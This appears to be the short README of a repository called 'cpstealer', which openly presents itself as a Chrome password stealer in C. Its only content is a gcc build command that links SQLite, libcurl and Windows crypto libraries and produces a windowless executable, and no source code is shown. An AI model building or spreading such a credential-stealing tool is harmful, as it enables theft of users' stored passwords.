# cpstealer
chrome passwords stealer in C

compile it on windows using gcc

gcc main.c sqlite3.lib -I. -L. -lcurl.dll -lcrypt32 -mwindows -o chromepwd.exe
